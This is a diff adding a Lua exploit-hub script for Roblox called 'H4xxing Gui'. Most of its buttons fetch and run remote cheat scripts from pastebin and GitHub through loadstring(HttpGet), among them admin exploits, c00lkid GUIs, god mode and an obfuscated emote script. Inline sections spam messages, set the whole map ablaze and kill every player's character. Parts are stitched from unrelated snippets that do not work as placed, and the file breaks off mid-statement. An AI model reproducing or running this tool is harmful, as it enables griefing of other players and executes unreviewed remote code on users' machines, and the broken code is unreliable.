@@ -1,0 +1,2040 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "H4xxing Gui",
+   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+   LoadingTitle = "H4xxing Loading",
+   LoadingSubtitle = "H4xxingTeam",
+   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "H4xxing Gui"
+   },
+
+   Discord = {
+      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
+      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+
+   KeySystem = false, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "H4xxing Gui",
+      Subtitle = "Key System",
+      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
+      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may your key file
+      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {"Key:H4xxingT3am"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("H4xxing","Team")
+   }
+})
+
+local Tab = Window:CreateTab("Admin🔥", 4483362458) -- Title, Image
+
+
+local Button = Tab:CreateButton({
+   Name = "Infinite yield♾️",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Nameless Admin💻",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Simple Spy🔎",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpyBeta.lua"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "AK ADMIN🔫💻",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet("https://angelical.me/ak.lua"))()
+   end,
+})
+
+local Tab = Window:CreateTab("Emote😎", 4483362458) -- Title, Image
+
+local Button = Tab:CreateButton({
+   Name = "FE EMOTE😁",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/oldfehub/main/boronide%20level%20obfuscation%20lol"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "AFEM FAKE EMOTE😐",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+   end,
+})
+
+local Tab = Window:CreateTab("c00lkid gui🟥", 4483362458) -- Title, Image
+
+local Button = Tab:CreateButton({
+   Name = "c00lkid gui v2🟥",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet("https://pastebin.com/raw/PSVp7F85"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "c00lkid gui v1🟥",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet("https://pastebin.com/raw/6jprKgQf"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "C00lkid gui by c00lkid🟥",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/c00lgui-1/36410b4f949d3a10e8b39fc7cdcc8cfb67aefe25/c00l%20gui"))()
+   end,
+})
+
+local Tab = Window:CreateTab("HACKS⌨️", 4483362458) -- Title, Image
+
+local Toggle = Tab:CreateToggle({
+   Name = "GOD MODE💪🏻",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+   -- The function that takes place when the toggle is pressed
+   -- The variable (Value) is a boolean on whether the toggle is true or false
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Dizzysky1/god-mode-universal-script-2024/main/script'))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "ANTI-AFK😐",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+wait(0.5)
+local Main = Instance.new("ScreenGui")
+local Title = Instance.new("TextLabel")
+local MainFrame = Instance.new("Frame")
+local EndTItle = Instance.new("TextLabel")
+local AfkStatus = Instance.new("TextLabel")
+
+Main.Parent = game.CoreGui
+
+Main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+
+Title.Parent = Main;
+
+Title.Active = true
+Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title.BorderColor3 = Color3.fromRGB(0, 0, 255)
+Title.Draggable = true
+Title.Position = UDim2.new(0.698610067, 0, 0.098096624, 0)
+Title.Size = UDim2.new(0, 370, 0, 52)
+Title.Font = Enum.Font.SourceSansBold;
+Title.Text = "Anti Afk | by aoki0x"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 22;
+
+MainFrame.Parent = Title
+
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BorderColor3 = Color3.fromRGB(0, 0, 255)
+MainFrame.Position = UDim2.new(0, 0, 1.0192306, 0)
+MainFrame.Size = UDim2.new(0, 370, 0, 107)
+
+EndTItle.Parent = MainFrame
+EndTItle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+EndTItle.BorderColor3 = Color3.fromRGB(0, 0, 255)
+EndTItle.Position = UDim2.new(0, 0, 0.800455689, 0)
+EndTItle.Size = UDim2.new(0, 370, 0, 21)
+EndTItle.Font = Enum.Font.SourceSansBold;
+EndTItle.Text = "RemiAPE"
+EndTItle.TextColor3 = Color3.fromRGB(255, 255, 255)
+EndTItle.TextSize = 20;
+
+AfkStatus.Parent = MainFrame
+
+AfkStatus.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+AfkStatus.BorderColor3 = Color3.fromRGB(0, 0, 255)
+AfkStatus.Position = UDim2.new(0, 0, 0.158377, 0)
+AfkStatus.Size = UDim2.new(0, 370, 0 ,44)
+AfkStatus.Font = Enum.Font.SourceSansBold;
+AfkStatus.Text = "Anti Afk Status: Active"
+AfkStatus.TextColor3 = Color3.fromRGB(255, 255, 255)
+AfkStatus.TextSize = 20;
+
+local abc = game:service'VirtualUser'
+
+game:service'Players'.LocalPlayer.Idled:connect(function()
+
+    AfkStatus:CaptureController()
+    AfkStatus:ClickButton2(Vector2.new())
+
+    AfkStatus.Text = "Roblox Tried To Kick You."
+    wait(2)
+    AfkStatus.Text = "Anti Afk Status: Active"
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "GIVE CLASSIC SWORD🗡",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+local swordName = "ClassicSword"
+local swordStorage = game.ServerStorage:FindFirstChild(swordName)
+local part = script.Parent
+
+local function onTouch(hit)
+    local character = hit.Parent
+    local player = game.Players:GetPlayerFromCharacter(character)
+    if player and character:FindFirstChild("Humanoid") then
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack and not backpack:FindFirstChild(swordName) and not character:FindFirstChild(swordName) then
+            local swordClone = swordStorage:Clone()
+            swordClone.Parent = backpack
+            print("Sword given to", player.Name)
+        end
+    end
+end
+
+part.Touched:Connect(onTouch)
+   end,
+})
+
+local Tab = Window:CreateTab("1x1x1x1 GUI🟩", 4483362458) -- Title, Image
+
+local Button = Tab:CreateButton({
+   Name = "FE 1x1x1x1🟩",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Name = Instance.new("TextLabel")
+local Credits = Instance.new("TextLabel")
+local e1x1x1x1Message = Instance.new("TextButton")
+local e1x1x1x1Music = Instance.new("TextButton")
+local e1x1x1x1Laugh = Instance.new("TextButton")
+local DayToNight = Instance.new("TextButton")
+local e666 = Instance.new("TextButton")
+local EpicSaxGuy = Instance.new("TextButton")
+local Disc0 = Instance.new("TextButton")
+local e2006Theme = Instance.new("TextButton")
+local ForceField = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.Position = UDim2.new(0.382171214, 0, 0.328530252, 0)
+Frame.Size = UDim2.new(0, 378, 0, 250)
+
+Name.Name = "Name"
+Name.Parent = Frame
+Name.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Name.Size = UDim2.new(0, 378, 0, 25)
+Name.Font = Enum.Font.GothamBold
+Name.Text = "1x1x1x1 Gui"
+Name.TextColor3 = Color3.fromRGB(0, 0, 0)
+Name.TextScaled = true
+Name.TextSize = 14.000
+Name.TextWrapped = true
+
+Credits.Name = "Credits"
+Credits.Parent = Frame
+Credits.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Credits.Position = UDim2.new(0, 0, 0.912, 0)
+Credits.Size = UDim2.new(0, 378, 0, 22)
+Credits.Font = Enum.Font.GothamBold
+Credits.Text = "By ChipsBBQexe"
+Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
+Credits.TextScaled = true
+Credits.TextSize = 14.000
+Credits.TextWrapped = true
+
+e1x1x1x1Message.Name = "e1x1x1x1Message"
+e1x1x1x1Message.Parent = Frame
+e1x1x1x1Message.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+e1x1x1x1Message.Position = UDim2.new(0.0714285746, 0, 0.216000006, 0)
+e1x1x1x1Message.Size = UDim2.new(0, 79, 0, 31)
+e1x1x1x1Message.Font = Enum.Font.GothamBold
+e1x1x1x1Message.Text = "1x1x1x1 Message"
+e1x1x1x1Message.TextColor3 = Color3.fromRGB(0, 0, 0)
+e1x1x1x1Message.TextScaled = true
+e1x1x1x1Message.TextSize = 14.000
+e1x1x1x1Message.TextWrapped = true
+e1x1x1x1Message.MouseButton1Down:connect(function()
+	while true do
+		wait(12)--set this to how much time between messages
+		msg = Instance.new ("Hint")
+		msg.Parent = game.Workspace
+		msg.Text = "1x1x1x1: MUHAWHAWHAW! NOOBS! I HAVE RETURNED FOR MY REVENGE!"
+		wait(6)
+		msg:remove()
+		wait(3)
+		msg = Instance.new("Message")
+		msg.Parent = game.Workspace
+		msg.Text = "1x1x1x1: NOW YOU WILL ALL PARISH IN MY FIRE OF DOOM!"
+		wait(6)
+		msg:remove()
+		wait(3)
+		msg = Instance.new("Message")
+		msg.Parent = game.Workspace
+		msg.Text = "1x1x1x1: I WILL DESTROY YOU ALL! YOU ARE WORTHLESS!"
+		wait(6)
+		msg:remove()
+		wait(3)
+		msg = Instance.new("Message")
+		msg.Parent = game.Workspace
+		msg.Text = "1x1x1x1: YOU WILL NOT LIVE THROUGH MY DEADLY ATTACKS!"
+		wait(6)
+		msg:remove()
+		wait(3)
+		msg = Instance.new("Message")
+		msg.Parent = game.Workspace
+		msg.Text = "1x1x1x1: I MIGHT AS WELL CLONE YOU INTO BOTS!"
+		wait(6)
+		msg:remove()
+		wait(3)
+		msg = Instance.new("Message")
+		msg.Parent = game.Workspace
+		msg.Text = "1x1x1x1: AND THEN THOSE BOTS WILL DESTROY ROBLOX! HAHAHAHAHA!"
+		wait(6)
+		msg:remove()
+		wait(3)
+		msg = Instance.new("Message")
+		msg.Parent = game.Workspace
+		msg.Text = "1x1x1x1: YOU CAN'T STOP ME! THERES NOTHING YOU CAN DO!"
+		wait(6)
+		msg:remove()
+	end
+end)
+e1x1x1x1Music.Name = "e1x1x1x1Music"
+e1x1x1x1Music.Parent = Frame
+e1x1x1x1Music.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+e1x1x1x1Music.Position = UDim2.new(0.0714285746, 0, 0.436000019, 0)
+e1x1x1x1Music.Size = UDim2.new(0, 79, 0, 31)
+e1x1x1x1Music.Font = Enum.Font.GothamBold
+e1x1x1x1Music.Text = "1x1x1x1 Music"
+e1x1x1x1Music.TextColor3 = Color3.fromRGB(0, 0, 0)
+e1x1x1x1Music.TextScaled = true
+e1x1x1x1Music.TextSize = 14.000
+e1x1x1x1Music.TextWrapped = true
+e1x1x1x1Music.MouseButton1Down:connect(function()
+	--Made by Servano
+
+	local s = Instance.new("Sound")
+
+	s.Name = "Sound"
+	s.SoundId = "http://www.roblox.com/asset/?id=27697743"
+	s.Volume = 1
+	s.Pitch = 3
+	s.Looped = true
+	s.archivable = false
+
+	s.Parent = game.Workspace
+
+	wait(1)
+
+	s:play()
+end)
+e1x1x1x1Laugh.Name = "e1x1x1x1Laugh"
+e1x1x1x1Laugh.Parent = Frame
+e1x1x1x1Laugh.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+e1x1x1x1Laugh.Position = UDim2.new(0.0714285746, 0, 0.648000002, 0)
+e1x1x1x1Laugh.Size = UDim2.new(0, 79, 0, 34)
+e1x1x1x1Laugh.Font = Enum.Font.GothamBold
+e1x1x1x1Laugh.Text = "1x1x1x1 Laugh"
+e1x1x1x1Laugh.TextColor3 = Color3.fromRGB(0, 0, 0)
+e1x1x1x1Laugh.TextScaled = true
+e1x1x1x1Laugh.TextSize = 14.000
+e1x1x1x1Laugh.TextWrapped = true
+e1x1x1x1Laugh.MouseButton1Down:connect(function()
+	--Made by Servano
+
+	local s = Instance.new("Sound")
+
+	s.Name = "Sound"
+	s.SoundId = "http://www.roblox.com/asset/?id=35935204"
+	s.Volume = 1
+	s.Pitch = 0.9
+	s.Looped = true
+	s.archivable = false
+
+	s.Parent = game.Workspace
+
+	wait(1)
+
+	s:play()
+end)
+DayToNight.Name = "DayToNight"
+DayToNight.Parent = Frame
+DayToNight.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+DayToNight.Position = UDim2.new(0.388888896, 0, 0.216000006, 0)
+DayToNight.Size = UDim2.new(0, 83, 0, 31)
+DayToNight.Font = Enum.Font.GothamBold
+DayToNight.Text = "Night"
+DayToNight.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayToNight.TextScaled = true
+DayToNight.TextSize = 14.000
+DayToNight.TextWrapped = true
+DayToNight.MouseButton1Down:connect(function()
+	while true do 
+		print ("Loop cycle start")
+		game.Lighting.TimeOfDay = "18:00:00"
+		wait(0.5)
+	end
+end)
+e666.Name = "e666"
+e666.Parent = Frame
+e666.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+e666.Position = UDim2.new(0.388888896, 0, 0.43599999, 0)
+e666.Size = UDim2.new(0, 83, 0, 31)
+e666.Font = Enum.Font.GothamBold
+e666.Text = "666"
+e666.TextColor3 = Color3.fromRGB(0, 0, 0)
+e666.TextScaled = true
+e666.TextSize = 14.000
+e666.TextWrapped = true
+e666.MouseButton1Down:connect(function()
+	for i,v in next,workspace:children''do
+		if(v:IsA'BasePart')then
+			me=v;
+			bbg=Instance.new('BillboardGui',me);
+			bbg.Name='stuf';
+			bbg.Adornee=me;
+			bbg.Size=UDim2.new(2.5,0,2.5,0)
+			--bbg.StudsOffset=Vector3.new(0,2,0)
+			tlb=Instance.new'TextLabel';
+			tlb.Text='666 666 666 666 666 666';
+			tlb.Font='SourceSansBold';
+			tlb.FontSize='Size48';
+			tlb.TextColor3=Color3.new(1,0,0);
+			tlb.Size=UDim2.new(1.25,0,1.25,0);
+			tlb.Position=UDim2.new(-0.125,-22,-1.1,0);
+			tlb.BackgroundTransparency=1;
+			tlb.Parent=bbg;
+		end;end;
+	function xds(dd)
+		for i,v in next,dd:children''do
+			if(v:IsA'BasePart')then
+				v.BrickColor=BrickColor.new'Really black';
+				v.TopSurface='Smooth';
+				v.BottomSurface='Smooth';
+				s=Instance.new('SelectionBox',v);
+				s.Adornee=v;
+				s.Color=BrickColor.new'Really red';
+				a=Instance.new('PointLight',v);
+				a.Color=Color3.new(1,0,0);
+				a.Range=15;
+				a.Brightness=5;
+				f=Instance.new('Fire',v);
+				f.Size=19;
+				f.Heat=22;
+			end;
+			game.Lighting.TimeOfDay=0;
+			game.Lighting.Brightness=0;
+			game.Lighting.ShadowColor=Color3.new(0,0,0);
+			game.Lighting.Ambient=Color3.new(1,0,0);
+			game.Lighting.FogEnd=200;
+			game.Lighting.FogColor=Color3.new(0,0,0);
+			local dec = 'http://www.roblox.com/asset/?id=19399245';
+			local fac = {'Front', 'Back', 'Left', 'Right', 'Top', 'Bottom'}
+			--coroutine.wrap(function()
+			--for ,_ in pairs(fac) do
+			--local ddec = Instance.new("Decal", v)
+			--ddec.Face = 
+			--ddec.Texture = dec
+			--end end)()
+			if #(v:GetChildren())>0 then
+				xds(v) 
+			end
+		end
+	end
+	xds(game.Workspace)
+end)
+EpicSaxGuy.Name = "EpicSaxGuy"
+EpicSaxGuy.Parent = Frame
+EpicSaxGuy.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+EpicSaxGuy.Position = UDim2.new(0.388888896, 0, 0.648000002, 0)
+EpicSaxGuy.Size = UDim2.new(0, 83, 0, 34)
+EpicSaxGuy.Font = Enum.Font.GothamBold
+EpicSaxGuy.Text = "Epic Sax Guy"
+EpicSaxGuy.TextColor3 = Color3.fromRGB(0, 0, 0)
+EpicSaxGuy.TextScaled = true
+EpicSaxGuy.TextSize = 14.000
+EpicSaxGuy.TextWrapped = true
+EpicSaxGuy.MouseButton1Down:connect(function()
+	--Made by Servano
+
+	local s = Instance.new("Sound")
+
+	s.Name = "Sound"
+	s.SoundId = "http://www.roblox.com/asset/?id=358776516"
+	s.Volume = 1
+	s.Pitch = 1
+	s.Looped = true
+	s.archivable = false
+
+	s.Parent = game.Workspace
+
+	wait(1)
+
+	s:play()
+end)
+Disc0.Name = "Disc0"
+Disc0.Parent = Frame
+Disc0.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Disc0.Position = UDim2.new(0.693121672, 0, 0.216000006, 0)
+Disc0.Size = UDim2.new(0, 89, 0, 31)
+Disc0.Font = Enum.Font.GothamBold
+Disc0.Text = "Disco"
+Disc0.TextColor3 = Color3.fromRGB(0, 0, 0)
+Disc0.TextScaled = true
+Disc0.TextSize = 14.000
+Disc0.TextWrapped = true
+Disc0.MouseButton1Down:connect(function()
+	while true do
+
+		game.Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
+		wait(.25)
+
+	end
+end)
+e2006Theme.Name = "e2006Theme"
+e2006Theme.Parent = Frame
+e2006Theme.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+e2006Theme.Position = UDim2.new(0.693121672, 0, 0.43599999, 0)
+e2006Theme.Size = UDim2.new(0, 89, 0, 31)
+e2006Theme.Font = Enum.Font.GothamBold
+e2006Theme.Text = "2006 Music"
+e2006Theme.TextColor3 = Color3.fromRGB(0, 0, 0)
+e2006Theme.TextScaled = true
+e2006Theme.TextSize = 14.000
+e2006Theme.TextWrapped = true
+e2006Theme.MouseButton1Down:connect(function()
+	--Made by Servano
+
+	local s = Instance.new("Sound")
+
+	s.Name = "Sound"
+	s.SoundId = "http://www.roblox.com/asset/?id=1987072964"
+	s.Volume = 1
+	s.Pitch = 1
+	s.Looped = true
+	s.archivable = false
+
+	s.Parent = game.Workspace
+
+	wait(1)
+
+	s:play()
+end)
+ForceField.Name = "ForceField"
+ForceField.Parent = Frame
+ForceField.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ForceField.Position = UDim2.new(0.693121672, 0, 0.648000002, 0)
+ForceField.Size = UDim2.new(0, 89, 0, 34)
+ForceField.Font = Enum.Font.GothamBold
+ForceField.Text = "FF"
+ForceField.TextColor3 = Color3.fromRGB(0, 0, 0)
+ForceField.TextScaled = true
+ForceField.TextSize = 14.000
+ForceField.TextWrapped = true
+ForceField.MouseButton1Down:connect(function()
+	-- Gui to Lua
+	-- Version: 3.
+	-- Instances:
+
+	local ForceFieldGUI = Instance.new("ScreenGui")
+	local ForceFieldGUI_2 = Instance.new("TextButton")
+	local ForceFieldOFF = Instance.new("TextButton")
+	local ForceFieldON = Instance.new("TextButton")
+
+	--Properties:
+
+	ForceFieldGUI.Name = "ForceFieldGUI"
+	ForceFieldGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+	ForceFieldGUI_2.Name = "ForceFieldGUI"
+	ForceFieldGUI_2.Parent = ForceFieldGUI
+	ForceFieldGUI_2.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+	ForceFieldGUI_2.BackgroundTransparency = 0.300
+	ForceFieldGUI_2.BorderColor3 = Color3.fromRGB(245, 244, 247)
+	ForceFieldGUI_2.BorderSizePixel = 0
+	ForceFieldGUI_2.Position = UDim2.new(0, 0, 0, 240)
+	ForceFieldGUI_2.Size = UDim2.new(0, 100, 0, 20)
+	ForceFieldGUI_2.Text = "ForceField"
+	ForceFieldGUI_2.TextColor3 = Color3.fromRGB(17, 17, 17)
+	ForceFieldGUI_2.TextTransparency = 0.300
+
+	ForceFieldOFF.Name = "ForceFieldOFF"
+	ForceFieldOFF.Parent = ForceFieldGUI
+	ForceFieldOFF.BackgroundColor3 = Color3.fromRGB(253, 253, 253)
+	ForceFieldOFF.BackgroundTransparency = 0.300
+	ForceFieldOFF.BorderColor3 = Color3.fromRGB(245, 244, 247)
+	ForceFieldOFF.BorderSizePixel = 0
+	ForceFieldOFF.Position = UDim2.new(0, 0, 0, 280)
+	ForceFieldOFF.Size = UDim2.new(0, 100, 0, 20)
+	ForceFieldOFF.Visible = false
+	ForceFieldOFF.Text = "Off"
+	ForceFieldOFF.TextColor3 = Color3.fromRGB(17, 17, 17)
+
+	ForceFieldON.Name = "ForceFieldON"
+	ForceFieldON.Parent = ForceFieldGUI
+	ForceFieldON.BackgroundColor3 = Color3.fromRGB(253, 253, 253)
+	ForceFieldON.BackgroundTransparency = 0.300
+	ForceFieldON.BorderColor3 = Color3.fromRGB(245, 244, 247)
+	ForceFieldON.BorderSizePixel = 0
+	ForceFieldON.Position = UDim2.new(0, 0, 0, 260)
+	ForceFieldON.Size = UDim2.new(0, 100, 0, 20)
+	ForceFieldON.Visible = false
+	ForceFieldON.Text = "On"
+	ForceFieldON.TextColor3 = Color3.fromRGB(17, 17, 17)
+
+	-- Scripts:
+
+	local function DVAWVL_fake_script() -- ForceFieldGUI_2.Script 
+		local script = Instance.new('Script', ForceFieldGUI_2)
+
+		function onClicked(GUI)
+			h = script.Parent.Parent.Parent.Parent.Character:findFirstChild("Humanoid")
+			if (h ~= nil) then
+				script.Parent.Parent.ForceFieldOFF.Visible = true
+				script.Parent.Parent.ForceFieldON.Visible = true
+			else return end
+		end
+		script.Parent.MouseButton1Click:connect(onClicked)
+	end
+	coroutine.wrap(DVAWVL_fake_script)()
+	local function HYECSMJ_fake_script() -- ForceFieldOFF.Script 
+		local script = Instance.new('Script', ForceFieldOFF)
+
+		function onClicked(GUI)
+			f = script.Parent.Parent.Parent.Parent.Character:findFirstChild("ForceField")
+			if (f ~= nil) then
+				f:remove()
+			else return end
+		end
+		script.Parent.MouseButton1Click:connect(onClicked)
+	end
+	coroutine.wrap(HYECSMJ_fake_script)()
+	local function LOYRXPU_fake_script() -- ForceFieldOFF.Script 
+		local script = Instance.new('Script', ForceFieldOFF)
+
+		function onClicked(GUI)
+			h = script.Parent.Parent.Parent.Parent.Character:findFirstChild("Humanoid")
+			if (h ~= nil) then
+				script.Parent.Parent.ForceFieldOFF.Visible = false
+				script.Parent.Parent.ForceFieldON.Visible = false
+			else return end
+		end
+		script.Parent.MouseButton1Click:connect(onClicked)
+	end
+	coroutine.wrap(LOYRXPU_fake_script)()
+	local function PFEVNBW_fake_script() -- ForceFieldON.Script 
+		local script = Instance.new('Script', ForceFieldON)
+
+		function onClicked(GUI)
+			h = script.Parent.Parent.Parent.Parent.Character:findFirstChild("Humanoid")
+			if (h ~= nil) then
+				FF = Instance.new("ForceField")
+				FF.Parent = script.Parent.Parent.Parent.Parent.Character
+			else return end
+		end
+		script.Parent.MouseButton1Click:connect(onClicked)
+	end
+	coroutine.wrap(PFEVNBW_fake_script)()
+	local function FNHQ_fake_script() -- ForceFieldON.Script 
+		local script = Instance.new('Script', ForceFieldON)
+
+		function onClicked(GUI)
+			h = script.Parent.Parent.Parent.Parent.Character:findFirstChild("Humanoid")
+			if (h ~= nil) then
+				script.Parent.Parent.ForceFieldOFF.Visible = false
+				script.Parent.Parent.ForceFieldON.Visible = false
+			else return end
+		end
+		script.Parent.MouseButton1Click:connect(onClicked)
+	end
+	coroutine.wrap(FNHQ_fake_script)()
+end)
+-- Scripts:
+
+local function QFCS_fake_script() -- Frame.Dragify 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
+end
+coroutine.wrap(QFCS_fake_script)()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "1x1x1x1 Character Script by BunnyX🟩",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+msg = Instance.new("Message")
+msg.Parent = game.Workspace
+msg.Text = "1x1x1x1: YOU WILL NOT LIVE THROUGH MY DEADLY ATTACKS!"
+wait(6)
+msg:remove()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "1x1x1x1 Script by xXednas01HAKINGXx🟩",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+game.Lighting.Ambient = Color3.new(255,0,0)
+for i, player in ipairs(game.Players:GetPlayers()) do
+    if player.Character then
+        local hum = player.Character:FindFirstChild('Humanoid')
+        if hum then
+            hum.Health = 0
+        end
+    end
+end
+   end,
+})
+
+local Tab = Window:CreateTab("MUSIC🎵", 4483362458) -- Title, Image
+
+local Button = Tab:CreateButton({
+   Name = "PLAY MUSIC PLAYER🎵",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qdbi/Rave-Hub/refs/heads/main/Rave%20Hub%20Language%20Selection", true))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "PLAY MUSIC🎵",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+local songs = {
+	{ Name = "Raining Tacos", Id = "rbxassetid://158666489" },
+	{ Name = "Exit the Earth's Atmosphere", Id = "rbxassetid://1571702965" },
+	{ Name = "Bad Apple (Bad Psy!! Remix)", Id = "rbxassetid://4565796080" },
+	{ Name = "Payphone)", Id = "rbxassetid://131396974" },
+}
+
+local icons = {
+	Pause = "rbxassetid://6813750293",
+	Play = "rbxassetid://6813750207",
+	Mute = "rbxassetid://6813750387",
+	Volume = "rbxassetid://6813750121",
+}
+
+local ORIGINAL_VOLUME = 100
+
+local Player = {
+	CurrentIndex = 1,
+	Songs = { table.unpack(songs) },
+	Paused = false,
+	Volume = ORIGINAL_VOLUME,
+	PlayNext = Instance.new("BindableEvent"),
+}
+
+local function changeIndex(i)
+	i = tonumber(i) or 1
+	local ni = Player.CurrentIndex + i
+	local sl = #Player.Songs
+	
+	if ni > sl then
+		ni -= sl
+	elseif ni < 1 then
+		ni += sl
+	end
+	
+	Player.CurrentIndex = ni
+end
+
+local function fireNext()
+	Player.PlayNext:Fire()
+end
+
+local song = script:FindFirstChild("Sound") or script:WaitForChild("Sound")
+
+local gui = script.Parent
+local container = gui.Frame.Container
+local buttons = container.Buttons
+
+song.Ended:Connect(fireNext)
+song.Stopped:Connect(fireNext)
+
+buttons.Mute.MouseButton1Click:Connect(function()
+	Player.Volume = Player.Volume == 100 and ORIGINAL_VOLUME or 100
+	buttons.Mute.Icon.Image = Player.Volume == 100 and icons.Volume or icons.Mute
+end)
+
+buttons.Pause.MouseButton1Click:Connect(function()
+	Player.Paused = not Player.Paused
+	buttons.Pause.Icon.Image = Player.Paused and icons.Play or icons.Pause
+end)
+
+buttons.Previous.MouseButton1Click:Connect(function()
+	Player.CurrentIndex -= 2
+	song:Stop()
+end)
+
+buttons.Next.MouseButton1Click:Connect(function()
+	song:Stop()
+end)
+
+game:GetService("RunService").Heartbeat:Connect(function()
+	container.Bar.Indicator.Size = UDim2.new(
+		math.clamp(song.TimePosition / song.TimeLength, 0, 1),
+		0, 1, 0
+	)
+	container.Duration.Text = string.format("%i:%02i - %i:%02i",
